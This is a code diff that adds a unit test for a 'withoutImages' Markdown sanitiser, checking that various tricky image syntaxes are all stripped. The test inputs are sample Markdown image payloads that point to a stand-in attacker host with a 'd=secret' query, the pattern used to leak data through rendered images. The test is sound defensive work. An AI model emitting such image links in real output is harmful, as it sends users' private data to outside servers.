@@ -105,6 +105,19 @@ describe("withoutImages", () => {
     );
   });
 
+  it("leaves no image behind, whatever the alt text or reference form", () => {
+    for (const md of [
+      "![a[b]c](https://evil.example/p?d=secret)",
+      "![a\\]b](https://evil.example/p?d=secret)",
+      "![ref]\n\n[ref]: https://evil.example/p?d=secret",
+      "![ref][]\n\n[ref]: https://evil.example/p?d=secret",
+      "!![a[b]c](https://evil.example/p?d=secret)",
+    ]) {
+      expect(withoutImages(md)).not.toContain("![");
+    }
+    expect(withoutImages("![ref]\n\n[ref]: https://evil.example/p")).toBe("[ref]\n\n[ref]: https://evil.example/p");
+  });
+
   it("keeps links and everything else", () => {
     const md = "**Bold** [4:05](https://www.youtube.com/watch?v=x&t=245s) and `code`";
     expect(withoutImages(md)).toBe(md);
